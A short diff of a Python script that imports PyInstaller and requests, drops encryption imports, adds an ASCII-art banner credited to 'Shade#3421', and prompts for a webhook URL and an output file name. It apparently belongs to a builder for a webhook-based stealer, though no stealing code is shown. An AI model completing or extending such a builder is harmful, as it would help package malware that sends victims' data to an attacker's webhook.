@@ -1,16 +1,49 @@
 import os
 import shutil
 import requests
-import base64
-import random
 import PyInstaller.__main__
 
-from Crypto.Cipher import AES
-from Crypto import Random
+
 
 def endHandler():
   os._exit(0)
 
+  print('''
+           .-""-.                    _
+          /  _   \              _   /|)
+        .'---""-.|             /|) /|/
+      .'          `.          /|/ /|/
+   __/_             \    .   /|/ /|/
+ .'    `-.          .8-. \\-/|/ /|/
+J   .--.  Y     .o./ .o8\ |/\ `/_.-.
+|  (    \       98P  888| /\ / ( ` |
+|  `-._/          |   `"|/\ / \|\  F
+ `.     .            "-'|\ / \/\  J
+   |---'              _/\ / \// ` |
+   J                 /// /   /   F
+   _\    .'`-._    ./// /   /\\.'
+  /  `. / .-'  `<-'/// /  _/\ \\
+  F.--.\||       `.`/ /.-' )|\ \`.
+  \__.-/)'         `.-'   ')/\\  /
+ .-' .'/  \               ')  `-'
+(  .'.'   '`.            .'
+ \'.'    '   `.       .-'
+  /     '      `.__.-'/|
+ J     :          `._/ |
+ |     :               |
+ J     ;-"""-.         F
+  \   /       \       /
+   `.J         L   _.'
+     F         |--' |
+     J         |    |__
+      L        |       `.
+      |        |-.      \|
+      |           \   )_.'
+      |        -.\ )-'
+      \         )_)
+       `"""""""'
+Made By Shade#3421
+''')
 webhookk = input(f"Input Webhook: ")
 
 fileName = input(f"Input File Name: ")
